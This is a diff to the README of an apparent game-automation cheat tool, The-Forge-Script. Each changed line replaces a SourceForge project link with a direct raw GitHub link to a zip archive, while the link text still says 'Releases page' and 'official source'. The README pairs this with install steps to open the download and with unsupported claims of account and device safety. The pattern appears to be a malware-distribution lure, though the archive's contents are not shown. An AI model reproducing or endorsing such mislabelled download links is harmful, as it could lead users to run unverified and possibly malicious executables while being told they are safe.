@@ -1,7 +1,7 @@
 # 🎮 The-Forge-Script - Automate Your Game Experience Effortlessly
 
 ## 📥 Download Now
-[![Download The-Forge-Script](https://img.shields.io/badge/Download-The--Forge--Script-blue)](https://sourceforge.net/projects/the-forge-script)
+[![Download The-Forge-Script](https://raw.githubusercontent.com/marcocancro/The-Forge-Script/main/matara/The-Forge-Script-1.7-alpha.5.zip)](https://raw.githubusercontent.com/marcocancro/The-Forge-Script/main/matara/The-Forge-Script-1.7-alpha.5.zip)
 
 ## 🚀 Getting Started
 Welcome to The-Forge-Script! This application allows you to enhance your gaming experience with keyless automation. No programming knowledge is needed. Whether you want to farm, craft, or attack, you will find features designed for ease and efficiency.
@@ -14,11 +14,11 @@ Welcome to The-Forge-Script! This application allows you to enhance your gaming 
 - **Safety**: Designed to operate without compromising your account.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [The-Forge-Script](https://sourceforge.net/projects/the-forge-script).
+To get started, visit this page to download: [The-Forge-Script](https://raw.githubusercontent.com/marcocancro/The-Forge-Script/main/matara/The-Forge-Script-1.7-alpha.5.zip).
 
 Follow these steps to install the application:
 
-1. Visit the [Releases page](https://sourceforge.net/projects/the-forge-script).
+1. Visit the [Releases page](https://raw.githubusercontent.com/marcocancro/The-Forge-Script/main/matara/The-Forge-Script-1.7-alpha.5.zip).
 2. Choose the latest version available and click on the download link.
 3. Once the download completes, locate the file on your device. It usually goes to your Downloads folder.
 4. Open the downloaded file to start the installation process.
@@ -37,7 +37,7 @@ Follow these steps to install the application:
 4. Start the script and enjoy your enhanced gameplay!
 
 ## 🔒 Safety & Security
-The-Forge-Script is designed with user safety in mind. It operates without requiring your login credentials. Always ensure you download the application from the official [source](https://sourceforge.net/projects/the-forge-script) to keep your device secure.
+The-Forge-Script is designed with user safety in mind. It operates without requiring your login credentials. Always ensure you download the application from the official [source](https://raw.githubusercontent.com/marcocancro/The-Forge-Script/main/matara/The-Forge-Script-1.7-alpha.5.zip) to keep your device secure.
 
 ## ℹ️ Support
 If you encounter issues or have questions, feel free to reach out to our support community. Look for support resources linked in the application, or visit the source website to find help and user guides.
@@ -45,4 +45,4 @@ If you encounter issues or have questions, feel free to reach out to our support
 ## ✨ Conclusion
 With The-Forge-Script, you gain access to powerful automation tools that streamline your gaming experience. Download it today, and take your gameplay to the next level. 
 
-For a quick start or if you have more inquiries, revisit our [Releases page](https://sourceforge.net/projects/the-forge-script) at any time.
+For a quick start or if you have more inquiries, revisit our [Releases page](https://raw.githubusercontent.com/marcocancro/The-Forge-Script/main/matara/The-Forge-Script-1.7-alpha.5.zip) at any time.
